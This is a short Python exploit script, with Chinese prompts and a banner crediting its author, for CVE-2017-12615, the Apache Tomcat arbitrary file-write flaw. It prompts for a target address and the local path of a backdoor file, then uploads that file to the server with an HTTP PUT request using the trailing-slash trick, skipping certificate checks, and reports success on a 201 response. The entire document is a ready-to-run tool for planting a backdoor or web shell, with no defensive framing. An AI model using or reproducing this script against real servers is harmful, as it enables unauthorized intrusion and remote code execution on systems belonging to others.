import sys
import requests

def title():
    print("[-------------------------------------------------------------]")
    print("[--------------      Tomcat 文件写入漏洞      ---------------]")
    print("[--------               CVE-2017-12615               ----------]")
    print("[--------    use:python3 CVE-2017-12615.py --------]")
    print("[--------              Author:鸣蜩十四           ------------]")
    print("[-------------------------------------------------------------]")

def main() :
    if (len(sys.argv)==1):
        url = input("请输入目标网站地址(http://ip:port/)：")
        name = input("请为上传文件命名:")
        path = input("请输入后门的绝对地址:")
        poc(url,name,path)
    else :
        print("Example: \n   python3 " + sys.argv[0] + "\n")

def poc(url,name,path) :
    r = requests.put(url=url+name+'/',data=open(path, 'rb'),verify=False)
    if r.status_code == 201 :
        print("[+] 可能存在 Tomcat写入漏洞，请从网页查看是否上传成功")
    else :
        print("[-] 不存在该漏洞！")


if __name__ == "__main__" :
    title()
    main()
